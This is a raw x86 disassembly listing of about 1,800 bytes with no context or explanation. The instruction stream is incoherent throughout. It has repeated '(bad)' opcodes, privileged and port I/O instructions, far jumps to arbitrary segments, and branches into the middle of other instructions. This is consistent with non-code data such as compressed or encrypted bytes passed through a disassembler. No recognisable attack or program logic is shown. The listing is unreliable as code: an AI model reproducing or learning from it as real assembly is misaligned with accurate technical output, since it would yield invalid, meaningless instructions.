  6bc01a:	call   0x57a5:0x7bc8b156
  6bc021:	sti    
  6bc022:	cs jge 0x6bc055
  6bc025:	adc    BYTE PTR [eax+0x54],0x3b
  6bc029:	(bad)  
  6bc02a:	cwde   
  6bc02b:	test   al,0x0
  6bc02d:	push   esi
  6bc02e:	mov    ds:0x7ee36b16,al
  6bc033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bc034:	or     edi,DWORD PTR [eax]
  6bc036:	aad    0x8
  6bc038:	mov    dl,0xd5
  6bc03a:	ret    
  6bc03b:	sub    DWORD PTR [esi],esi
  6bc03d:	into   
  6bc03e:	or     DWORD PTR [eax+0xc],0x59
  6bc042:	(bad)  
  6bc043:	xlat   BYTE PTR ds:[ebx]
  6bc044:	cmp    eax,0x17273974
  6bc049:	in     al,dx
  6bc04a:	data16 (bad) 
  6bc04d:	jmp    0x6bc027
  6bc04f:	mov    esi,0x78d43229
  6bc054:	fdiv   DWORD PTR [ebp+0x75e4ff64]
  6bc05a:	mov    ah,0x9b
  6bc05c:	sar    DWORD PTR [esp+eiz*8],1
  6bc05f:	or     ebx,edx
  6bc061:	scas   eax,DWORD PTR es:[edi]
  6bc062:	cmp    BYTE PTR [edx-0x25ce9a1a],al
  6bc068:	inc    esp
  6bc069:	jbe    0x6bc07c
  6bc06b:	(bad)  
  6bc06c:	mov    ecx,0xaf9b0cfd
  6bc071:	fistp  DWORD PTR [ecx]
  6bc073:	push   edi
  6bc075:	ret    0xe0ad
  6bc078:	dec    esi
  6bc079:	add    cl,BYTE PTR [esi-0x24]
  6bc07c:	cs jl  0x6bbfff
  6bc07f:	pop    eax
  6bc080:	push   ds
  6bc081:	pop    ecx
  6bc082:	xor    ebx,0x2f
  6bc085:	jmp    0x8d6e:0x1c7e34ea
  6bc08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bc08d:	sub    eax,0x57c63b47
  6bc092:	mov    al,0x2e
  6bc094:	dec    esp
  6bc095:	mov    DWORD PTR [eax+ebp*8-0x9fdeef1],eax
  6bc09c:	add    DWORD PTR [ebx+0x3a9e31f8],edx
  6bc0a2:	or     ch,BYTE PTR [edx+0x611917fc]
  6bc0a8:	fldcw  WORD PTR [ebx]
  6bc0aa:	cwde   
  6bc0ab:	xchg   esp,eax
  6bc0ac:	jo     0x6bc043
  6bc0ae:	pop    ecx
  6bc0af:	call   0xe27b:0x8ac5a84f
  6bc0b6:	jg     0x6bc04a
  6bc0b8:	jo     0x6bc11d
  6bc0ba:	cmp    DWORD PTR [esi],edx
  6bc0bc:	sti    
  6bc0bd:	jg     0x6bc046
  6bc0bf:	jmp    0x920c9af3
  6bc0c4:	clc    
  6bc0c5:	add    DWORD PTR gs:[ebp-0x7],esp
  6bc0c9:	or     al,cl
  6bc0cb:	pusha  
  6bc0cc:	outs   dx,BYTE PTR ds:[esi]
  6bc0cd:	adc    DWORD PTR [ecx-0x57],ebp
  6bc0d0:	push   esi
  6bc0d1:	ror    BYTE PTR [edi],cl
  6bc0d3:	mov    bl,0x4d
  6bc0d5:	leave  
  6bc0d6:	clc    
  6bc0d7:	sbb    dh,BYTE PTR [ebp-0x2a]
  6bc0da:	push   ecx
  6bc0db:	aad    0x8
  6bc0dd:	add    eax,0x30effcd0
  6bc0e2:	dec    edx
  6bc0e3:	push   ss
  6bc0e4:	arpl   WORD PTR [edi+0x36d20290],ax
  6bc0ea:	cmc    
  6bc0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bc0ec:	sbb    DWORD PTR [eax-0x57],ebx
  6bc0ef:	ss scas eax,DWORD PTR es:[edi]
  6bc0f1:	push   esp
  6bc0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bc0f3:	adc    al,dl
  6bc0f5:	mov    edx,0x20b0482
  6bc0fa:	fldenv [eax+ebx*4+0x8e4b808]
  6bc101:	outs   dx,BYTE PTR ds:[esi]
  6bc102:	pop    ebx
  6bc103:	scas   eax,DWORD PTR es:[edi]
  6bc104:	jmp    0x5536062a
  6bc109:	mov    BYTE PTR [bp+di],dl
  6bc10c:	jno    0x6bc0c5
  6bc10e:	push   es
  6bc10f:	push   edx
  6bc110:	jg     0x6bc0f4
  6bc112:	call   0x2f8f86da
  6bc117:	lock pop ss
  6bc119:	jge    0x6bc11e
  6bc11b:	lods   al,BYTE PTR ds:[esi]
  6bc11c:	ins    DWORD PTR es:[edi],dx
  6bc11d:	ficom  WORD PTR [edi]
  6bc11f:	ret    
  6bc120:	xchg   DWORD PTR [ecx+ebp*1+0x1f988ebb],ecx
  6bc127:	fs or  eax,0xc670c35e
  6bc12d:	inc    eax
  6bc12e:	add    DWORD PTR [edi+0x65daa919],0xe7f6f302
  6bc138:	sar    BYTE PTR [ecx],cl
  6bc13a:	push   cs
  6bc13b:	xor    al,0xc3
  6bc13d:	sub    DWORD PTR [ebx-0x75],ecx
  6bc140:	mov    dh,0x78
  6bc142:	rcl    BYTE PTR [eax-0x67],cl
  6bc145:	add    ah,BYTE PTR [ebx+0x645668e8]
  6bc14b:	mov    ds:0x65b769df,eax
  6bc150:	sub    eax,0x40ad6430
  6bc155:	lods   al,BYTE PTR ds:[esi]
  6bc156:	call   0x2a04f8cd
  6bc15b:	outs   dx,BYTE PTR ds:[esi]
  6bc15c:	bound  esi,QWORD PTR [ebx]
  6bc15e:	push   ecx
  6bc15f:	xor    DWORD PTR [ecx-0x28a78001],ecx
  6bc165:	push   ebx
  6bc166:	std    
  6bc167:	fs or  al,cl
  6bc16a:	push   edi
  6bc16b:	jo     0x6bc193
  6bc16d:	xor    BYTE PTR [edi],bh
  6bc16f:	push   ebp
  6bc170:	scas   al,BYTE PTR es:[edi]
  6bc171:	pusha  
  6bc172:	push   ds
  6bc173:	adc    DWORD PTR [ebp-0x58],0x43
  6bc177:	xor    BYTE PTR [esi+0x7fac62e5],ah
  6bc17d:	jnp    0x6bc1ad
  6bc17f:	fwait
  6bc180:	xchg   esp,eax
  6bc181:	fwait
  6bc182:	cmp    edx,DWORD PTR [eax+0x607c6d72]
  6bc188:	in     al,dx
  6bc189:	adc    bx,si
  6bc18c:	jo     0x6bc1ab
  6bc18e:	pushf  
  6bc18f:	ret    0xbbdc
  6bc192:	pop    ebx
  6bc193:	sub    BYTE PTR [eax],bl
  6bc195:	ror    esi,0xd4
  6bc198:	(bad)  
  6bc199:	lds    edi,FWORD PTR [edi-0x4e4c8a6c]
  6bc19f:	es ret 
  6bc1a1:	sub    ecx,DWORD PTR [edi+esi*1]
  6bc1a4:	mov    DWORD PTR [ecx-0x71],0xba762564
  6bc1ab:	fisub  DWORD PTR [edx-0x21]
  6bc1ae:	xor    eax,DWORD PTR [edx]
  6bc1b0:	stos   BYTE PTR es:[edi],al
  6bc1b1:	ffreep st(0)
  6bc1b3:	jo     0x6bc140
  6bc1b5:	dec    ecx
  6bc1b6:	mov    cl,0x54
  6bc1b8:	cmp    BYTE PTR [esi+0x6c],dl
  6bc1bb:	dec    esp
  6bc1bc:	hlt    
  6bc1bd:	ins    BYTE PTR es:[edi],dx
  6bc1be:	jne    0x6bc1ca
  6bc1c0:	sbb    DWORD PTR [ecx+0x6b],edx
  6bc1c3:	pop    ss
  6bc1c4:	inc    eax
  6bc1c5:	add    al,0x10
  6bc1c7:	fs push edx
  6bc1c9:	ror    ecx,0x3c
  6bc1cc:	out    dx,al
  6bc1cd:	cdq    
  6bc1ce:	push   edi
  6bc1cf:	mul    BYTE PTR [ecx+0x54]
  6bc1d2:	jns    0x6bc19e
  6bc1d4:	(bad)  
  6bc1d5:	pop    ebp
  6bc1d6:	lahf   
  6bc1d7:	ins    DWORD PTR es:[edi],dx
  6bc1d8:	nop
  6bc1d9:	rcl    DWORD PTR [eax],1
  6bc1db:	arpl   WORD PTR [ebx],bp
  6bc1dd:	(bad)  
  6bc1de:	daa    
  6bc1df:	repnz ins DWORD PTR es:[edi],dx
  6bc1e1:	xor    eax,0xcef66f31
  6bc1e6:	push   esi
  6bc1e7:	mov    edi,0xa0e5f487
  6bc1ec:	mov    edi,0x80584dc9
  6bc1f1:	sbb    al,0xb8
  6bc1f3:	pop    ds
  6bc1f4:	pop    eax
  6bc1f5:	jmp    0x6bc260
  6bc1f7:	enter  0x31c2,0x49
  6bc1fb:	or     al,0x53
  6bc1fd:	dec    eax
  6bc1fe:	xor    edi,DWORD PTR [ecx+ecx*8]
  6bc201:	aad    0xf9
  6bc203:	adc    bl,ch
  6bc205:	pushf  
  6bc206:	stos   DWORD PTR es:[edi],eax
  6bc207:	add    dl,BYTE PTR [esi-0x11fba1fc]
  6bc20d:	int3   
  6bc20e:	aas    
  6bc20f:	shr    DWORD PTR [ebp-0x4e1ed37e],0xe0
  6bc216:	test   eax,0x882405c3
  6bc21b:	in     eax,dx
  6bc21c:	push   edx
  6bc21d:	repz xor eax,0x47ced9bd
  6bc223:	aad    0x63
  6bc225:	dec    ebp
  6bc226:	inc    ebp
  6bc228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bc229:	das    
  6bc22a:	out    dx,eax
  6bc22b:	and    DWORD PTR [ebx+eiz*2+0x77],ecx
  6bc22f:	pop    edx
  6bc230:	mov    dh,0xb7
  6bc232:	adc    ch,BYTE PTR [esi+edx*1-0x27]
  6bc236:	outs   dx,DWORD PTR ds:[esi]
  6bc237:	imul   DWORD PTR [edi-0x1149b977]
  6bc23d:	pop    edx
  6bc23e:	sub    eax,0x19abcaa
  6bc243:	and    BYTE PTR [ebx+0x1357fb0f],dl
  6bc249:	lock lods al,BYTE PTR ds:[esi]
  6bc24b:	push   ebx
  6bc24c:	loope  0x6bc210
  6bc24e:	or     DWORD PTR [ecx+0x77],ecx
  6bc251:	ss adc eax,0x4ce054c8
  6bc257:	inc    eax
  6bc258:	mov    esi,0x8977a76
  6bc25d:	mov    edi,0x3b09d05d
  6bc262:	je     0x6bc2e1
  6bc264:	sar    al,0x5c
  6bc267:	sub    ah,BYTE PTR [ebx+eiz*8-0x7155239d]
  6bc26e:	adc    DWORD PTR ds:0x72d5483a,esi
  6bc274:	aas    
  6bc275:	add    al,0x2a
  6bc277:	cmp    ah,cl
  6bc279:	jne    0x6bc2c4
  6bc27b:	sbb    al,0xe6
  6bc27d:	push   ecx
  6bc27e:	lock push 0x78
  6bc281:	cmp    esp,DWORD PTR [edx+ecx*2]
  6bc284:	jns    0x6bc262
  6bc286:	add    eax,0x400de1fa
  6bc28b:	int    0x81
  6bc28d:	mov    dh,0x46
  6bc28f:	retf   0x87f0
  6bc292:	lods   eax,DWORD PTR ds:[esi]
  6bc293:	mov    ebp,0xd584ba56
  6bc298:	jne    0x6bc26b
  6bc29a:	sbb    ah,BYTE PTR [edi+0x7b]
  6bc29d:	fwait
  6bc29e:	clc    
  6bc29f:	xor    dh,dh
  6bc2a1:	jnp    0x6bc25b
  6bc2a3:	mov    ch,0x2a
  6bc2a5:	sub    bh,al
  6bc2a7:	push   ecx
  6bc2a8:	inc    ecx
  6bc2a9:	inc    eax
  6bc2aa:	xchg   ebp,eax
  6bc2ab:	ds dec esp
  6bc2ad:	xor    edx,edi
  6bc2af:	nop
  6bc2b0:	loopne 0x6bc23f
  6bc2b2:	sbb    dh,ah
  6bc2b4:	mov    esi,0xa18580dc
  6bc2b9:	daa    
  6bc2ba:	xor    eax,ebx
  6bc2bc:	xor    esp,0x6346835a
  6bc2c2:	shr    BYTE PTR [esp+edi*8-0x3788bb58],cl
  6bc2c9:	or     BYTE PTR [esp+edx*1-0x29],cl
  6bc2cd:	inc    edx
  6bc2ce:	pop    esi
  6bc2cf:	aas    
  6bc2d0:	jbe    0x6bc297
  6bc2d2:	psubusw mm4,QWORD PTR [edi-0x47]
  6bc2d6:	ret    0xbe69
  6bc2d9:	xchg   DWORD PTR [edx+eax*8-0x40],esp
  6bc2dd:	int    0x4f
  6bc2df:	push   0xa8aed5c2
  6bc2e4:	inc    ebp
  6bc2e5:	dec    esi
  6bc2e6:	cmp    edi,DWORD PTR [edi]
  6bc2e8:	push   ebp
  6bc2e9:	popf   
  6bc2ea:	adc    al,0x57
  6bc2ec:	and    bl,BYTE PTR [ecx]
  6bc2ee:	mov    ebx,0xf96e6ddf
  6bc2f3:	xor    edx,DWORD PTR [ecx+0x1c851337]
  6bc2f9:	cdq    
  6bc2fa:	jp     0x6bc2fd
  6bc2fc:	test   eax,0xcbc2ba56
  6bc301:	in     al,0xbd
  6bc303:	sub    dh,cl
  6bc305:	in     al,dx
  6bc306:	mov    DWORD PTR [ebx],eax
  6bc308:	shr    BYTE PTR ds:0xe1fcf2ad,0x2b
  6bc30f:	sub    BYTE PTR [eax-0x65],bl
  6bc312:	pusha  
  6bc313:	cli    
  6bc314:	push   ebx
  6bc315:	mov    ah,0x5d
  6bc317:	pop    ss
  6bc318:	pop    ebx
  6bc319:	clc    
  6bc31a:	cmp    BYTE PTR [eax],cl
  6bc31c:	push   ebp
  6bc31d:	stos   BYTE PTR es:[edi],al
  6bc31e:	(bad)  
  6bc320:	push   ecx
  6bc321:	clc    
  6bc322:	add    eax,0xfa4283d9
  6bc327:	sahf   
  6bc328:	loope  0x6bc364
  6bc32a:	iret   
  6bc32b:	fs push ds
  6bc32d:	sbb    DWORD PTR [edx-0x17],ecx
  6bc330:	loop   0x6bc338
  6bc332:	mov    DWORD PTR [eax],edx
  6bc334:	pop    edx
  6bc335:	cmp    eax,0xd528df28
  6bc33a:	cmc    
  6bc33b:	lea    edx,[ebx+ebx*8]
  6bc33e:	pop    ebp
  6bc33f:	fiadd  WORD PTR [ecx]
  6bc341:	push   edx
  6bc342:	add    DWORD PTR [edx+0xf372f10],eax
  6bc348:	push   0x1a43a7d3
  6bc34d:	int    0xd
  6bc34f:	xchg   ebp,eax
  6bc350:	pop    ebp
  6bc351:	into   
  6bc352:	mov    BYTE PTR [esi+0x23dfc49d],ch
  6bc358:	add    eax,0x5a9e27d4
  6bc35d:	sti    
  6bc35e:	mov    cl,0xbc
  6bc360:	and    al,0xb9
  6bc362:	mov    ebp,0x161d1a2d
  6bc367:	idiv   al
  6bc369:	mov    edi,0x1dff05ab
  6bc36e:	pushf  
  6bc36f:	sbb    dh,ah
  6bc371:	rcr    DWORD PTR [edx],0x6c
  6bc374:	iret   
  6bc375:	sar    BYTE PTR [eax+edi*4+0x2c43054f],1
  6bc37c:	mov    esp,0x56967409
  6bc381:	rcr    DWORD PTR [ecx],cl
  6bc383:	and    esi,esp
  6bc385:	mov    esp,0x608c4635
  6bc38a:	mov    al,0x43
  6bc38c:	or     esp,DWORD PTR [ebp-0xbd87b90]
  6bc392:	out    dx,al
  6bc393:	dec    eax
  6bc394:	mov    dl,0x5d
  6bc396:	retf   
  6bc397:	jmp    0xf3b5:0x89a0bafe
  6bc39e:	std    
  6bc39f:	jecxz  0x6bc3a4
  6bc3a1:	mov    DWORD PTR [edx+ecx*1-0x27],0x80735177
  6bc3a9:	mov    ebp,0x4c9d59e3
  6bc3ae:	call   0xffe5d4e3
  6bc3b3:	cmp    al,0x2b
  6bc3b5:	psrad  mm0,mm3
  6bc3b8:	inc    edx
  6bc3b9:	jp     0x6bc386
  6bc3bb:	add    ebx,DWORD PTR [ebp-0x60c222b3]
  6bc3c1:	pop    esi
  6bc3c2:	repnz or esp,DWORD PTR [eax]
  6bc3c5:	gs dec esp
  6bc3c7:	mov    esp,0xc0c86fbc
  6bc3cc:	jbe    0x6bc423
  6bc3ce:	jns    0x6bc36c
  6bc3d0:	cmp    DWORD PTR [edi],esi
  6bc3d2:	mov    ds:0xc48578e5,al
  6bc3d7:	add    BYTE PTR [eax],bh
  6bc3d9:	dec    ebx
  6bc3da:	add    al,0x88
  6bc3dc:	inc    esp
  6bc3dd:	dec    ebx
  6bc3de:	jecxz  0x6bc3f8
  6bc3e0:	les    ecx,FWORD PTR [edi-0x19]
  6bc3e3:	outs   dx,DWORD PTR ds:[esi]
  6bc3e4:	ss push edx
  6bc3e6:	push   ds
  6bc3e7:	mov    DWORD PTR ds:0xe55c8c8e,ecx
  6bc3ed:	mov    esp,0x40f678de
  6bc3f2:	in     eax,0x21
  6bc3f4:	nop
  6bc3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bc3f6:	pop    ds
  6bc3f7:	gs dec ebx
  6bc3f9:	xor    edx,ebx
  6bc3fb:	cmp    dl,dh
  6bc3fd:	loopne 0x6bc47b
  6bc3ff:	push   edi
  6bc400:	sub    ch,BYTE PTR [esi+0x4e]
  6bc403:	lahf   
  6bc404:	or     esi,DWORD PTR [edx+0x2f32eb1f]
  6bc40a:	fisubr WORD PTR [ebp-0x33]
  6bc40d:	sub    al,0xe3
  6bc40f:	sub    eax,0xf173f71c
  6bc414:	lods   al,BYTE PTR ds:[esi]
  6bc415:	shl    BYTE PTR [edx],0x9c
  6bc418:	fs jb  0x6bc3c3
  6bc41b:	cld    
  6bc41c:	retf   0xf772
  6bc41f:	and    esp,eax
  6bc421:	jle    0x6bc4a0
  6bc423:	test   DWORD PTR [ebp+0x23],ecx
  6bc426:	or     ebp,DWORD PTR [edi-0x38]
  6bc429:	push   ecx
  6bc42a:	and    cl,BYTE PTR [eax+0x4f086686]
  6bc430:	mov    ecx,0xd8f307c3
  6bc435:	adc    eax,0x979976e7
  6bc43a:	xor    dh,BYTE PTR [esi]
  6bc43c:	xchg   ecx,eax
  6bc43d:	push   es
  6bc43e:	adc    BYTE PTR [eax+0x3946a0c7],bh
  6bc444:	xor    dh,BYTE PTR [edx+0x70]
  6bc447:	jbe    0x6bc3e7
  6bc449:	in     eax,dx
  6bc44a:	mov    ebx,0x12c1ee9a
  6bc44f:	fisttp DWORD PTR [ebx-0x19]
  6bc452:	int    0x8b
  6bc454:	mov    al,0xee
  6bc456:	aam    0xe7
  6bc458:	icebp  
  6bc459:	xchg   esp,eax
  6bc45a:	dec    esi
  6bc45b:	push   0x54d002f6
  6bc460:	pop    eax
  6bc461:	stos   BYTE PTR es:[di],al
  6bc463:	push   0x72b755c5
  6bc468:	sbb    ebx,DWORD PTR [edi-0x5e198ba9]
  6bc46e:	mov    esi,0xa1376053
  6bc473:	sub    eax,0xca0a5902
  6bc478:	push   ds
  6bc479:	cmp    BYTE PTR [ebx],dl
  6bc47b:	ss hlt 
  6bc47d:	(bad)  
  6bc47e:	div    ch
  6bc480:	int3   
  6bc481:	les    ecx,FWORD PTR [edi]
  6bc483:	lods   eax,DWORD PTR ds:[esi]
  6bc484:	add    edi,DWORD PTR [ecx-0x3b]
  6bc487:	add    ch,BYTE PTR [edx-0x47788d5e]
  6bc48d:	ret    0x86a1
  6bc490:	mov    ch,0xf2
  6bc492:	add    esi,DWORD PTR [esi]
  6bc494:	mov    esp,0x45671e7e
  6bc499:	ins    DWORD PTR es:[edi],dx
  6bc49a:	shl    BYTE PTR [edx-0x74],1
  6bc49d:	jecxz  0x6bc4d0
  6bc49f:	dec    ebp
  6bc4a0:	push   edx
  6bc4a1:	jle    0x6bc4d1
  6bc4a3:	leave  
  6bc4a4:	mov    bh,0xbc
  6bc4a6:	sbb    esi,DWORD PTR [ebx]
  6bc4a8:	jae    0x6bc47d
  6bc4aa:	pop    ebp
  6bc4ab:	jno    0x6bc457
  6bc4ad:	push   0x78
  6bc4af:	hlt    
  6bc4b0:	mov    ds:0xe32fa77e,eax
  6bc4b5:	mov    ss,WORD PTR [ebx+ebx*2-0x4f]
  6bc4b9:	in     al,0xe2
  6bc4bb:	cs cdq 
  6bc4bd:	jns    0x6bc504
  6bc4bf:	and    al,BYTE PTR [eax]
  6bc4c1:	ds in  eax,0x50
  6bc4c4:	adc    dl,cl
  6bc4c6:	call   0x14deb66e
  6bc4cb:	jl     0x6bc539
  6bc4cd:	sub    DWORD PTR [ebp-0x5269e9f6],ebx
  6bc4d3:	fucom  st(1)
  6bc4d5:	test   al,0x9a
  6bc4d7:	mov    bl,0x9d
  6bc4d9:	xlat   BYTE PTR ds:[ebx]
  6bc4da:	pop    ebx
  6bc4db:	dec    eax
  6bc4dc:	or     al,BYTE PTR [ecx+edi*8]
  6bc4df:	test   eax,0x38f9a24f
  6bc4e4:	dec    eax
  6bc4e5:	leave  
  6bc4e6:	xchg   ebp,eax
  6bc4e7:	sbb    edi,ebx
  6bc4e9:	in     eax,0xab
  6bc4eb:	mov    ah,0x8c
  6bc4ed:	call   0xcf09:0xb88d131b
  6bc4f4:	mov    eax,ds:0x925817d0
  6bc4f9:	xchg   ebx,ebx
  6bc4fb:	xchg   ebx,eax
  6bc4fc:	sahf   
  6bc4fd:	add    BYTE PTR [ecx+0x7c56d95c],0xa1
  6bc504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bc505:	dec    edi
  6bc506:	xor    esi,ebp
  6bc508:	aaa    
  6bc509:	fmul   QWORD PTR [ecx]
  6bc50b:	mov    esp,0xc7a5593a
  6bc510:	mov    ch,0x97
  6bc512:	nop
  6bc513:	cmp    eax,0x3179b972
  6bc518:	and    eax,0x522595d2
  6bc51d:	push   0x40
  6bc51f:	cwde   
  6bc520:	fldcw  WORD PTR [edx-0x48]
  6bc523:	leave  
  6bc524:	xor    ebx,esi
  6bc526:	popa   
  6bc527:	repnz adc DWORD PTR [ecx],0x73
  6bc52b:	jno    0x6bc521
  6bc52d:	addr16 or ebp,edi
  6bc530:	imul   eax,DWORD PTR [ebp-0x3a],0xffffffbd
  6bc534:	pop    edx
  6bc535:	iret   
  6bc536:	mov    ch,0xb5
  6bc538:	and    eax,0x928d7d24
  6bc53d:	popa   
  6bc53e:	push   edx
  6bc53f:	and    eax,0x13e4c2be
  6bc544:	xor    al,0xd
  6bc546:	ficom  WORD PTR [ebp+0x290e431d]
  6bc54c:	sbb    ecx,DWORD PTR [edi+eiz*4]
  6bc54f:	(bad)  
  6bc550:	and    al,0xf1
  6bc552:	push   0xffffffcd
  6bc554:	xor    dh,BYTE PTR [esi]
  6bc556:	inc    ebp
  6bc557:	ds sbb eax,0x17b04368
  6bc55d:	mov    eax,0xb5a9a175
  6bc563:	pushf  
  6bc564:	cld    
  6bc565:	shl    BYTE PTR fs:[ebx+0x4d],0xda
  6bc56a:	jmp    0x7caf:0xd6cc8dd6
  6bc571:	jecxz  0x6bc5dc
  6bc573:	rcr    BYTE PTR [ebp+eax*4-0x34e7ef32],0x28
  6bc57b:	js     0x6bc5c2
  6bc57d:	in     al,0x3b
  6bc57f:	push   0x6a
  6bc581:	lock fild QWORD PTR [eax-0x7a]
  6bc585:	push   eax
  6bc586:	inc    ecx
  6bc587:	jbe    0x6bc5e1
  6bc589:	cwde   
  6bc58a:	dec    ebp
  6bc58b:	shr    esp,cl
  6bc58d:	int3   
  6bc58e:	cld    
  6bc58f:	cmp    DWORD PTR ds:0x8b315573,edx
  6bc595:	cmp    bh,0x56
  6bc598:	lds    esi,FWORD PTR [ebx]
  6bc59a:	dec    eax
  6bc59b:	jp     0x6bc53f
  6bc59d:	xchg   esi,eax
  6bc59e:	inc    eax
  6bc59f:	mov    ecx,0x6f94bb63
  6bc5a4:	icebp  
  6bc5a5:	adc    edx,DWORD PTR [ebx+ebp*1]
  6bc5a8:	inc    ebx
  6bc5a9:	xchg   edx,eax
  6bc5aa:	dec    ebx
  6bc5ab:	pop    ebp
  6bc5ac:	shl    dl,cl
  6bc5ae:	ret    
  6bc5af:	cmp    BYTE PTR [ecx+eiz*2-0x79],ch
  6bc5b3:	outs   dx,DWORD PTR ds:[esi]
  6bc5b4:	stc    
  6bc5b5:	inc    eax
  6bc5b6:	stos   BYTE PTR es:[edi],al
  6bc5b7:	lods   al,BYTE PTR ds:[esi]
  6bc5b8:	add    al,0x6f
  6bc5ba:	xchg   ebx,ebx
  6bc5bc:	ds adc eax,0x76b031f3
  6bc5c2:	pop    ebx
  6bc5c3:	cdq    
  6bc5c4:	(bad)  
  6bc5c5:	push   0xfffffff8
  6bc5c7:	dec    esp
  6bc5c8:	clc    
  6bc5c9:	nop
  6bc5ca:	shr    eax,cl
  6bc5cc:	inc    ebx
  6bc5cd:	pusha  
  6bc5ce:	push   ebx
  6bc5cf:	popa   
  6bc5d0:	out    dx,al
  6bc5d1:	or     eax,0x13829241
  6bc5d6:	push   eax
  6bc5d7:	sub    ecx,DWORD PTR [ebp+0x61]
  6bc5da:	das    
  6bc5db:	fnstenv [edx]
  6bc5dd:	pop    esp
  6bc5de:	and    edx,esp
  6bc5e0:	pop    ds
  6bc5e1:	sahf   
  6bc5e2:	adc    al,0xd2
  6bc5e4:	xchg   BYTE PTR [edx-0x45],bl
  6bc5e7:	mov    ch,0xf8
  6bc5e9:	sub    ebx,DWORD PTR [ecx+0x54]
  6bc5ec:	hlt    
  6bc5ed:	and    DWORD PTR ds:0x2864abc2,0x3e
  6bc5f4:	cwde   
  6bc5f5:	lods   al,BYTE PTR ds:[esi]
  6bc5f6:	jmp    0xe407d542
  6bc5fb:	sub    eax,0x406f0d21
  6bc600:	into   
  6bc601:	push   0x22
  6bc603:	sbb    DWORD PTR [ecx+ebx*2-0x5ed7a3fc],esp
  6bc60a:	pop    ecx
  6bc60b:	xor    ecx,DWORD PTR cs:[ebp+0x53]
  6bc60f:	test   BYTE PTR [edx],0xe7
  6bc612:	jbe    0x6bc68d
  6bc614:	int    0xab
  6bc616:	test   BYTE PTR [esi-0x68],0x24
  6bc61a:	inc    ebx
  6bc61b:	test   al,0x6
  6bc61d:	mov    eax,0xbf03ebcb
  6bc622:	adc    al,BYTE PTR [ecx-0x601b6f80]
  6bc628:	leave  
  6bc629:	scas   al,BYTE PTR es:[edi]
  6bc62a:	sbb    eax,0x68fe9f9c
  6bc62f:	xchg   DWORD PTR [ebp+0x5707428d],ebp
  6bc635:	std    
  6bc636:	mov    cl,0xfe
  6bc638:	fst    st(6)
  6bc63a:	pminub mm6,QWORD PTR [ecx-0x2ff8f3f3]
  6bc641:	cld    
  6bc642:	ror    dl,1
  6bc644:	pushf  
  6bc645:	cmp    BYTE PTR [ebp+edx*4-0x25],0xf2
  6bc64a:	xchg   ebp,eax
  6bc64b:	clc    
  6bc64c:	pusha  
  6bc64d:	xchg   esi,eax
  6bc64e:	xor    al,0x29
  6bc650:	test   DWORD PTR [eax+eax*2+0x40],edx
  6bc654:	mov    bh,0x12
  6bc656:	idiv   DWORD PTR [edi+0x58]
  6bc659:	mov    BYTE PTR [edx-0x22a5c7ad],ch
  6bc65f:	stc    
  6bc660:	pop    edx
  6bc661:	das    
  6bc662:	xor    DWORD PTR [eax],ecx
  6bc664:	mov    dl,ch
  6bc666:	pop    edx
  6bc667:	and    BYTE PTR [eax+0x1c],dl
  6bc66a:	test   DWORD PTR [edx+0x5b3402b3],ebp
  6bc670:	(bad)  
  6bc671:	mov    al,0xf3
  6bc673:	add    esp,DWORD PTR [edi]
  6bc675:	aad    0x91
  6bc677:	cld    
  6bc678:	and    DWORD PTR [ebx+0x77b68b1a],edi
  6bc67e:	sbb    al,0xfc
  6bc680:	gs mov ebp,0x910c592c
  6bc686:	dec    ecx
  6bc687:	rcr    DWORD PTR [ebx-0x296a4cac],1
  6bc68d:	mov    al,ds:0x4d7f8057
  6bc692:	mov    ebp,esi
  6bc694:	jle    0x6bc62e
  6bc696:	inc    esp
  6bc697:	xchg   edi,eax
  6bc698:	je     0x6bc67c
  6bc69a:	or     ecx,DWORD PTR ds:[edi-0x7f]
  6bc69e:	pusha  
  6bc69f:	mov    ds,WORD PTR [ebx-0x31085148]
  6bc6a5:	or     dl,BYTE PTR [edi+ebp*8-0x6b]
  6bc6a9:	shl    BYTE PTR [ecx+edi*8-0x3481e970],0xbe
  6bc6b1:	xor    edi,DWORD PTR [ecx+0x65]
  6bc6b4:	mov    al,0x79
  6bc6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bc6b7:	jecxz  0x6bc63f
  6bc6b9:	mov    ah,0xa8
  6bc6bb:	lahf   
  6bc6bc:	push   ds
  6bc6bd:	cmp    ecx,ecx
  6bc6bf:	xchg   esi,eax
  6bc6c0:	ds push edx
  6bc6c2:	inc    edx
  6bc6c3:	stc    
  6bc6c4:	add    bh,dh
  6bc6c6:	jb     0x6bc653
  6bc6c8:	push   edx
  6bc6c9:	jne    0x6bc6e7
  6bc6cb:	clc    
  6bc6cc:	sar    BYTE PTR [eax-0x2bd9f86a],cl
  6bc6d2:	mov    ah,0x4a
  6bc6d4:	mov    cl,0x42
  6bc6d6:	pop    es
  6bc6d7:	add    DWORD PTR [edx+edi*4+0x1f],0xffffff93
  6bc6dc:	push   edi
  6bc6dd:	loopne 0x6bc711
  6bc6df:	daa    
  6bc6e0:	adc    DWORD PTR [edi+0x2d512e18],ebx
  6bc6e6:	jl     0x6bc726
  6bc6e8:	sbb    eax,0xa2810c2f
  6bc6ed:	cmp    DWORD PTR [ebx],ebp
  6bc6ef:	or     al,0xc6
  6bc6f1:	and    al,0x19
  6bc6f3:	push   esi
  6bc6f4:	jle    0x6bc70b
  6bc6f6:	push   ss
  6bc6f7:	push   ebx
  6bc6f8:	into   
  6bc6f9:	sbb    eax,0xcb5fad09
  6bc6fe:	out    dx,al
  6bc6ff:	jp     0x6bc6be
  6bc701:	jb     0x6bc6c4
  6bc703:	mov    edx,0x88d3501d
  6bc708:	in     eax,dx
  6bc709:	lods   eax,DWORD PTR ds:[esi]
  6bc70a:	dec    esp
  6bc70b:	outs   dx,DWORD PTR ds:[esi]
  6bc70c:	in     eax,0x5a
  6bc70e:	mov    ah,0xf2
  6bc710:	pusha  
  6bc711:	mov    dh,0x68
  6bc713:	jmp    0x6bc6da
  6bc715:	repnz xor DWORD PTR [ebp+ecx*1-0x48075104],esp
  6bc71d:	out    0xaf,eax
  6bc71f:	in     eax,0xb3
  6bc721:	or     esi,DWORD PTR [eax]
  6bc723:	pop    edi
